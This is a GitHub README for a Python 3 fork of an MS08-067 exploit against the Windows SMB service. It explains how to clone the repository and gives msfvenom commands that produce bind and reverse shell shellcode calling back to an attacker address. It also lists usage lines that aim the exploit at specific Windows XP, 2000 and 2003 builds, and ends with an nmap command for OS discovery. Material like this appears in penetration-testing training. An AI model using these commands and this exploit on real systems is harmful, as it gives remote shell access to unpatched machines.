# MS08_067 Python Exploit Script - Updated 2023

[andyacer](https://github.com/andyacer/ms08_067) did a fantastic job creating this repo, however his python code need some updating to work in a python3 enviroment, which can be found on this forked repo.

## Installation on Kali

`git clone https://github.com/MF-R00T/ms08_067/`

## Generating Shellcode

Example msfvenom commands to generate shellcode.  Just paste these into the file which you'll edit after downloading.  'Cause you're an awesome hacker like that.

```
msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```
## Usage

Usage: ms08_067_2018.py <target ip> <os #> <Port #>

* ms08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
* ms08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
* ms08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
* ms08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
* ms08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
* ms08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
* ms08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

Also: nmap has a good OS discovery script that pairs well with this exploit:  
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1

